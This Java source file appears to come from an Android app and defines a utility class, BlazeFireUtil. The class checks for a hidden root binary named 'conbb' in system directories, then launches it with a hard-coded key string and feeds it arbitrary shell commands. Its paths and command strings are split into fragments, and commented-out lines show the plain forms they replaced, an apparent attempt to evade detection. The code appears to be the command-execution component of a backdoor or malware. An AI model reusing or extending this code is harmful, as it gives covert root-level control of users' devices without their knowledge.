package net.doll.holx.utils;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;

public class BlazeFireUtil {
	
    public static boolean hasRoot() {
//    	File file1 = new File("/system/bin/conbb");
//    	File file1 = new File(StrHelp1.BIN_PATH+StrHelp2.BIN_PATH+StrHelp3.BIN_PATH);
    	File file1 = new File(new StringBuffer(StrHelp1.BIN_PATH).append(StrHelp2.BIN_PATH).append(StrHelp3.BIN_PATH).toString());
//		File file2 = new File("/system/xbin/conbb");
//		File file2 = new File(StrHelp1.BIN_PATH+StrHelp2.XBIN_PATH+StrHelp3.BIN_PATH);
		File file2 = new File(new StringBuffer(StrHelp1.BIN_PATH).append(StrHelp2.XBIN_PATH).append(StrHelp3.BIN_PATH).toString());

		if (file1.exists() || file2.exists()) {
			return true;
		}
		
		return false;
    }

	
	public static String makeCmd(String cmd)
    {
        String result = "";
        DataOutputStream dos = null;
        BufferedReader dis = null;

        try
        {
            StringBuffer stringBuffer = new StringBuffer();
            stringBuffer.append("con").append("bb ").append("od2gf").append("04pd9");
            Process p = Runtime.getRuntime().exec(stringBuffer.toString());
            dos = new DataOutputStream(p.getOutputStream());
            dis = new BufferedReader(new InputStreamReader(p.getInputStream()));
            dos.writeBytes(cmd + "\n");
            dos.writeBytes("exit\n");
            dos.flush();
            String line = null;
            while ((line = dis.readLine()) != null)
            {
                result += line + "\n";
            }
            p.waitFor();
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
        finally
        {
            if (dos != null)
            {
                try
                {
                    dos.close();
                }
                catch (IOException e)
                {
                    e.printStackTrace();
                }
            }
            if (dis != null)
            {
                try
                {
                    dis.close();
                }
                catch (IOException e)
                {
                    e.printStackTrace();
                }
            }
        }
        return result;
    }
}
